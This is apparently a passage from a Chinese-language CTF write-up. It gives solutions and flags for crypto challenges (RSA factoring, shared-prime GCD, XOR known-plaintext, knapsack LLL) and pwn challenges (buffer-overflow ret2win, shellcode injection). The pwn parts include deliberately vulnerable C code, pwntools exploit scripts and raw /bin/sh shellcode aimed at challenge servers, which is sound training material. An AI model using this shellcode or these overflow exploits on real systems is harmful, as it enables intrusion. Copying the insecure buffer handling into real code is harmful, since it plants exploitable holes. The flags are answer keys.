class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = remote(<span class="hljs-string">&quot;35.193.60.121&quot;</span>, <span class="hljs-number">5337</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    flag = r.recvline()<br>    num = r.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>).replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>    word = r.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>).replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>    r.recvline()     <span class="hljs-comment"># Answer</span><br><br>    <span class="hljs-built_in">print</span>(num)<br>    <span class="hljs-built_in">print</span>(word)<br><br>    green = []<br>    red = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(word)):<br>        <span class="hljs-keyword">if</span> word[i] == <span class="hljs-string">&quot;g&quot;</span>:<br>            green.append(<span class="hljs-built_in">eval</span>(num[i]))<br>        <span class="hljs-keyword">else</span>:<br>            red.append(<span class="hljs-built_in">eval</span>(num[i]))<br><br>    green = <span class="hljs-built_in">sorted</span>(green)<br>    red = <span class="hljs-built_in">sorted</span>(red)<br><br>    result = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> word:<br>        <span class="hljs-keyword">if</span> i == <span class="hljs-string">&quot;g&quot;</span>:<br>            result.append(<span class="hljs-built_in">str</span>(green.pop()))<br>        <span class="hljs-keyword">else</span> :<br>            result.append(<span class="hljs-built_in">str</span>(red.pop()))<br><br>    r.sendline(<span class="hljs-string">&quot;&quot;</span>.join(result).encode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>    <span class="hljs-built_in">print</span>(r.recvline())<br><br><span class="hljs-comment"># accessdenied&#123;gr33n_fl4gs_f0r_m3_4nd_r3d_fl4g5_4re_f0r_y0u_c8e0c8a3&#125;</span><br></code></pre></td></tr></table></figure><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><p>有些题有想法但是解不出来</p><h2 id="rsa-1"><a class="markdownIt-Anchor" href="#rsa-1"></a> <strong>RSA-1</strong></h2><p>Description：</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fsharp"><span class="hljs-keyword">let</span>&#x27;s <span class="hljs-built_in">get</span> down <span class="hljs-keyword">to</span> basics.<br></code></pre></td></tr></table></figure><p>附件内容如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">p</span> = <span class="hljs-number">10428615258416108003372202871855627713663325599674460924186517713082197448534315449595394752587304354394402047262801959990727856908043138185588365886987557</span><br><span class="hljs-attr">q</span> = <span class="hljs-number">8849030739304056868757301096931487921973840186794195322071503751716059434197468028088264340322992996182734000877348221433845302801843370163430108727308579</span><br><span class="hljs-attr">e</span> = <span class="hljs-number">65537</span><br><span class="hljs-attr">cipher_text</span> = <span class="hljs-number">84826403344972753121997388456739256614537789930909176473018827332005543366933391914385410712984001888365906754988120732970328825657318675360778107518188000885732104031648548997976916964730682864696944786364581243443475767387970255510475855029059715864139791778210784283726274424510221073880200865856769716576</span><br></code></pre></td></tr></table></figure><p>直接接就可以。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-attr"># accessdenied&#123;RSA_1</span>S_<span class="hljs-number">4</span><span class="hljs-name">M4</span>Z<span class="hljs-number">1</span><span class="hljs-symbol">nG_R1</span>GhT????_<span class="hljs-number">2</span>a<span class="hljs-number">5286</span>af&#125;<br></code></pre></td></tr></table></figure><h2 id="rsa-2"><a class="markdownIt-Anchor" href="#rsa-2"></a> <strong>RSA-2</strong></h2><p>Description：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">Ok, What are you gonna <span class="hljs-keyword">do</span> <span class="hljs-built_in">now</span>?<br></code></pre></td></tr></table></figure><p>附件内容：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">N</span> <span class="hljs-operator">=</span> <span class="hljs-number">264057768287532610924734156161085846111271356228103155462076871372364307056741048144764594645062879781647063846971890031256799636109911752078600428566502298518944558664381187</span><br><span class="hljs-attribute">e</span> <span class="hljs-operator">=</span> <span class="hljs-number">65537</span><br><span class="hljs-attribute">ct</span> <span class="hljs-operator">=</span> <span class="hljs-number">175347248748800717331910762241898102719683222504200516534883687111045877096093372005991552193144558951747833811929393668749668731738201985792026669764642235225240342271148171</span><br></code></pre></td></tr></table></figure><p>又是什么都没有，yafu分解。</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">F:</span>\CTFTools\yafu-<span class="hljs-number">1.34</span>&gt;yafu-x64.exe<br>factor(<span class="hljs-number">264057768287532610924734156161085846111271356228103155462076871372364307056741048144764594645062879781647063846971890031256799636109911752078600428566502298518944558664381187</span>)<br><br><br><span class="hljs-symbol">fac:</span> factoring <span class="hljs-number">264057768287532610924734156161085846111271356228103155462076871372364307056741048144764594645062879781647063846971890031256799636109911752078600428566502298518944558664381187</span><br><span class="hljs-symbol">fac:</span> <span class="hljs-keyword">using</span> pretesting plan: normal<br><span class="hljs-symbol">fac:</span> no tune info: <span class="hljs-keyword">using</span> qs/gnfs crossover <span class="hljs-keyword">of</span> <span class="hljs-number">95</span> digits<br><span class="hljs-symbol">div:</span> primes less than <span class="hljs-number">10000</span><br><span class="hljs-symbol">fmt:</span> <span class="hljs-number">1000000</span> iterations<br><span class="hljs-symbol">rho:</span> x^<span class="hljs-number">2</span> + <span class="hljs-number">3</span>, starting <span class="hljs-number">1000</span> iterations <span class="hljs-keyword">on</span> C174<br><span class="hljs-symbol">rho:</span> x^<span class="hljs-number">2</span> + <span class="hljs-number">2</span>, starting <span class="hljs-number">1000</span> iterations <span class="hljs-keyword">on</span> C174<br><span class="hljs-symbol">rho:</span> x^<span class="hljs-number">2</span> + <span class="hljs-number">1</span>, starting <span class="hljs-number">1000</span> iterations <span class="hljs-keyword">on</span> C174<br><span class="hljs-symbol">pm1:</span> starting B1 = <span class="hljs-number">150</span>K, B2 = gmp-ecm <span class="hljs-keyword">default</span> <span class="hljs-keyword">on</span> C174<br><span class="hljs-symbol">ecm:</span> <span class="hljs-number">30</span>/<span class="hljs-number">30</span> curves <span class="hljs-keyword">on</span> C174, B1=<span class="hljs-number">2</span>K, B2=gmp-ecm <span class="hljs-keyword">default</span><br><span class="hljs-symbol">ecm:</span> <span class="hljs-number">21</span>/<span class="hljs-number">74</span> curves <span class="hljs-keyword">on</span> C174, B1=<span class="hljs-number">11</span>K, B2=gmp-ecm <span class="hljs-keyword">default</span><br>Total factoring time = <span class="hljs-number">1.8447</span> seconds<br><br><br>***factors found***<br><br>P20 = <span class="hljs-number">22788121468146346999</span><br>P155 = <span class="hljs-number">11587518025855592759726630124584244020238845252808598255278658263482784394605886754984976163579618331619323699778956049111427022474635415206131197278729813</span><br><br>ans = <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>然后rsa解。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-attr"># accessdenied&#123;alw4</span>y<span class="hljs-number">5</span>_try_t<span class="hljs-number">0</span>_f<span class="hljs-number">4</span>ct<span class="hljs-number">0</span>r<span class="hljs-number">1</span>z<span class="hljs-number">3</span>_<span class="hljs-symbol">n_9</span>ba<span class="hljs-number">93547</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="small-key"><a class="markdownIt-Anchor" href="#small-key"></a> <strong>Small key</strong></h2><p>Description：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">I</span> got the key easily.<br></code></pre></td></tr></table></figure><p>附件是程序代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"> <span class="hljs-keyword">import</span> os<br><br> flag = <span class="hljs-string">b&quot;XXXXXX&quot;</span><br> key = os.urandom(<span class="hljs-number">8</span>)<br><br> cipher_text = <span class="hljs-string">b&quot;&quot;</span><br><br> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)):<br>     cipher_text += <span class="hljs-built_in">bytes</span>([flag[i] ^ key[i % <span class="hljs-number">8</span>]])<br><br><br> <span class="hljs-built_in">print</span>(cipher_text.<span class="hljs-built_in">hex</span>())<br><br><br><span class="hljs-comment"># flag 763d32726973a23f79373473616ba86a60300e677634f734482a626f6e5ff22e636a327c2f5ff228240123242e6caa23483d6127765fff6d743a61212f38bb</span><br></code></pre></td></tr></table></figure><p>我们知道明文accessdenied所以可以解出来key。然后用key去解整个密文。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> Crypto.Util.strxor <span class="hljs-keyword">import</span> strxor<br><br>flag_enc = libnum.n2s(<span class="hljs-number">0x763d32726973a23f79373473616ba86a60300e677634f734482a626f6e5ff22e636a327c2f5ff228240123242e6caa23483d6127765fff6d743a61212f38bb</span>)<br><br>flag_enc += <span class="hljs-string">b&quot;\x00&quot;</span>*(<span class="hljs-number">8</span> - (<span class="hljs-built_in">len</span>(flag_enc)%<span class="hljs-number">8</span>))<br><br>part = <span class="hljs-string">b&quot;accessde&quot;</span><br><br>key = strxor(part, flag_enc[:<span class="hljs-number">8</span>])<br><br>flag = [strxor(flag_enc[<span class="hljs-number">8</span>*i:<span class="hljs-number">8</span>*i+<span class="hljs-number">8</span>], key) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag_enc)//<span class="hljs-number">8</span>)]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">b&quot;&quot;</span>.join(flag))<br><br><span class="hljs-comment"># accessdenied&#123;kn0wn_pl41n_t3xt_4tt4ck5_4r3_r34lly_c00l_97cd0658&#125;</span><br></code></pre></td></tr></table></figure><h2 id="rsa-3"><a class="markdownIt-Anchor" href="#rsa-3"></a> <strong>RSA-3</strong></h2><p>Description：</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fsharp">ohh<span class="hljs-operator">..</span> What&#x27;s wrong <span class="hljs-keyword">with</span> <span class="hljs-built_in">using</span> common prime <span class="hljs-keyword">for</span> both <span class="hljs-keyword">public</span> keys<span class="hljs-operator">?</span><br></code></pre></td></tr></table></figure><p>附件内容：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">N1</span> <span class="hljs-operator">=</span> <span class="hljs-number">18266349196400324728796632198426724065863341515460128017379722167088811564142208540762217975696666190887534687486334974478770458134458646785682182438231047535912495200486295399237083743354006572775979196273345894016812147421648391560534928953791045301656072851030393661346227010573392017192092871743599780733618974144278058844414678104713310777338685821340236864598500469843212331330335171804328016140678014295178395686821469446312308097781506852568269309368807576215036130913554259546509277614896420588483929704110258122427731934119749960465772609969329231395097168664992720797902433454838999670183197496533599372453</span><br><span class="hljs-attribute">e1</span> <span class="hljs-operator">=</span> <span class="hljs-number">65537</span><br><span class="hljs-attribute">ct1</span> <span class="hljs-operator">=</span> <span class="hljs-number">6873813036805706192019236826822502457972771100457517090756917047060847774848540323350759250580238758998913544271128101335276213320240302206398066922772200444602226203653559017733029810367927075606003863202964202725297461799495530697341270915140044964898303984854574497628349362668695378519684693264593494716972185326436905495762497116849607924837994943127697112124217181161062684698865533001086211217060178202980704668203486578672364578669469712587269077695001297138207491663356223994825422557742042083843727850238507161657755737436196961552942941154267260840237025593539923533367161391402240798650010287812581011106</span><br><br><span class="hljs-attribute">N2</span> <span class="hljs-operator">=</span> <span class="hljs-number">24659767524526013018768938973883991511377669248630968999008468264428208747461052247749924232027616129566843290411914770222062361142014390330463814302544910044772535448949923181736285951382305617780092296934319600643083108399436503551987425616568398265868184384255524744326852580109993750455923648308457300741311644056806840080239266629430170801800674692923486070263947659308964150022391540089059138911526148899685247042835949241530880572488161927637699425020944697998483747469309576045917038431425710502056969197916002745593176785614139365197372746789456581367558816039809574657471032143676431357391125588624599050493</span><br><span class="hljs-attribute">e2</span> <span class="hljs-operator">=</span> <span class="hljs-number">65537</span><br><span class="hljs-attribute">ct2</span> <span class="hljs-operator">=</span>  <span class="hljs-number">11715772208083492702167997175167454009301340692399196360593824415816062365292031273728996255749695189978948242292097965040268601546052250584302206331424224398934005270192769085862845465718216946900897219973683677713043297722976307588263004621450861659350169718646844558379707749844428304916965303036455448719228506667752535085465025614399994834368259311922477097878143154258042140694172977284700008301528490157090476538427961683829505682126281348126157784828204887638985638647829395157101409725453166939388563809584382420835218557337222313577592617066209235421605768519128885685600282422644017925260843832358253267634</span><br></code></pre></td></tr></table></figure><p>描述说两个N公用了一个素数。所以GCD解出来就可以了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span> *<br><br>N1 = ...<br>e1 = <span class="hljs-number">65537</span><br>ct1 = ...<br><br>N2 = ...<br>e2 = <span class="hljs-number">65537</span><br>ct2 =  ...<br><br>p = <span class="hljs-built_in">int</span>(gcd(N1,N2))<br><span class="hljs-keyword">assert</span> isprime(p)<br>e = <span class="hljs-number">65537</span><br>d = <span class="hljs-built_in">int</span>(invert(e, p-<span class="hljs-number">1</span>))<br><br><span class="hljs-built_in">print</span>(n2s(<span class="hljs-built_in">pow</span>(ct1, d, p)))<br><span class="hljs-built_in">print</span>(n2s(<span class="hljs-built_in">pow</span>(ct2, d, p)))<br><br><span class="hljs-comment"># b&#x27;accessdenied&#123;r3us31ng_5tuff_1s&#x27;</span><br><span class="hljs-comment"># b&#x27;_n0t_f0r_crypt0gr4phy_69c36434&#125;&#x27;</span><br><br><span class="hljs-comment"># accessdenied&#123;r3us31ng_5tuff_1s_n0t_f0r_crypt0gr4phy_69c36434&#125;</span><br></code></pre></td></tr></table></figure><h2 id="merkle-is-a-good-man"><a class="markdownIt-Anchor" href="#merkle-is-a-good-man"></a> <strong>Merkle is a good man</strong></h2><p>Description：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Have you ever seen <span class="hljs-keyword">the</span> <span class="hljs-built_in">length</span> <span class="hljs-keyword">of</span> public key <span class="hljs-keyword">is</span> <span class="hljs-keyword">equal</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> msg bit <span class="hljs-built_in">length</span>?<br></code></pre></td></tr></table></figure><p>哈，一看到这个描述就知道是背包加密了。对于上次做背包加密方法对了但是代码写错了感到十分残念。</p><p>文件内容太长了，这里就不放了。</p><p>LLL约束求解。代码是sagemath。线上的sagemath不支持这种运算量。需要自己跑。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;enc.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> fp:<br>    encoded = <span class="hljs-built_in">eval</span>(fp.read())<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;public_key.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> fp:<br>    Pk = <span class="hljs-built_in">eval</span>(fp.read())<br><br>nbit = <span class="hljs-built_in">len</span>(Pk)<br>A = Matrix(ZZ, nbit + <span class="hljs-number">1</span>, nbit + <span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nbit):<br>    A[i, i] = <span class="hljs-number">1</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nbit):<br>    A[i, nbit] = Pk[i]<br>A[nbit, nbit] = -<span class="hljs-built_in">int</span>(encoded)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;processing&quot;</span>)<br>res = A.LLL()<br><br>flag = res[-<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>]<br><br>flag = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>, flag)))<br><br><span class="hljs-built_in">print</span>(b2s(flag))<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/CTF/access denied]<br>└─$ /home/kali/SageMath/SageMath/sage <span class="hljs-string">&quot;/home/kali/CTF/access denied/solve.sage.py&quot;</span><br>processing<br>b<span class="hljs-string">&#x27;accessdenied&#123;m3rkl3_h3llm4n_crypt0_1s_w34k_095403ff&#125;&#x27;</span><br><br><span class="hljs-comment"># accessdenied&#123;m3rkl3_h3llm4n_crypt0_1s_w34k_095403ff&#125;</span><br></code></pre></td></tr></table></figure><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> PWN</h1><p>适合用于教学和期末考试。</p><h2 id="ret2win"><a class="markdownIt-Anchor" href="#ret2win"></a> <strong>Ret2Win</strong></h2><p>Description：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Huh, <span class="hljs-keyword">jump, </span><span class="hljs-keyword">jump, </span><span class="hljs-keyword">jump </span>to win.<br><span class="hljs-symbol">server:</span> nc <span class="hljs-number">34</span>.<span class="hljs-number">134</span>.<span class="hljs-number">85</span>.<span class="hljs-number">196</span> <span class="hljs-number">1337</span><br></code></pre></td></tr></table></figure><p>源代码和文件都给了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">win</span><span class="hljs-params">()</span>&#123;<br>    system(<span class="hljs-string">&quot;cat flag.txt&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> name[<span class="hljs-number">32</span>];<br>    fgets(name, <span class="hljs-number">64</span>, <span class="hljs-built_in">stdin</span>);<br>    <span class="hljs-built_in">puts</span>(name);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    alarm(<span class="hljs-number">0x20</span>);<br>    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>    vuln();<br>&#125;<br></code></pre></td></tr></table></figure><p>缓冲区溢出劫持返回地址，跳转到win函数即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>  *<br><br>r = remote(<span class="hljs-string">&quot;34.134.85.196&quot;</span>, <span class="hljs-number">1337</span>)<br><br>r.sendline(p32(<span class="hljs-number">0x8049216</span>)*<span class="hljs-number">20</span>)<br><br>r.interactive()<br><br><span class="hljs-comment"># accessdenied&#123;fl0w_fl0w_0v3rfl0w_g3t_w1n_07372581&#125;</span><br></code></pre></td></tr></table></figure><h2 id="shellcode"><a class="markdownIt-Anchor" href="#shellcode"></a> <strong>shellcode</strong></h2><p>Description：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Beginner</span> code.<br><span class="hljs-attribute">server</span>: nc <span class="hljs-number">34.134.85.196</span> <span class="hljs-number">5337</span><br></code></pre></td></tr></table></figure><p>源代码和文件都给了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>alarm(<span class="hljs-number">0x20</span>);<br>    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-type">char</span> machine_code[<span class="hljs-number">512</span>];<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This only understands the machine code so you have to give only the machine code, so please enter the machine code below\n&quot;</span>);<br>fgets(machine_code, <span class="hljs-number">512</span>, <span class="hljs-built_in">stdin</span>);<br>((<span class="hljs-type">void</span> (*)())(machine_code))();<br>&#125;<br></code></pre></td></tr></table></figure><p>最后一句直接执行了我们输入的数据。所以送一个shellcode即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = remote(<span class="hljs-string">&quot;34.134.85.196&quot;</span>, <span class="hljs-number">5337</span>)<br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>r.sendline(<span class="hljs-string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span>)<br>r.interactive()<br><br><span class="hljs-comment"># accessdenied&#123;3x3cut3d_x64_sh3ll_0v3rfl0w_5ucc3ssfully_611a1501&#125;</span><br></code></pre></td></tr></table></figure><h2 id="ret2system"><a class="markdownIt-Anchor" href="#ret2system"></a> <strong>ret2system</strong></h2><p>Description：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">Oh</span></span>... Oh. I have <span class="hljs-keyword">system</span> here.<br>server: nc <span class="hljs-number">34.134</span><span class="hljs-number">.85</span><span class="hljs-number">.196</span> <span class="hljs-number">9337</span><br></code></pre></td></tr></table></figure><p>代码和文件都给了。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-id">#include</span> &lt;stdio<span class="hljs-selector-class">.h</span>&gt;<br><span class="hljs-selector-id">#include</span> &lt;stdlib<span class="hljs-selector-class">.h</span>&gt;<br><span class="hljs-selector-id">#include</span> &lt;unistd<span class="hljs-selector-class">.h</span>&gt;<br><br>char store<span class="hljs-selector-attr">[64]</span>;<br><br>void <span class="hljs-built_in">vuln</span>()&#123;<br>char buf<span class="hljs-selector-attr">[32]</span>;<br><span class="hljs-built_in">system</span>(&quot;date&quot;);<br><span class="hljs-built_in">printf</span>(&quot;You are allowed to store some value\n&quot;);<br><span class="hljs-built_in">fgets</span>(store, <span class="hljs-number">64</span>, stdin);<br><span 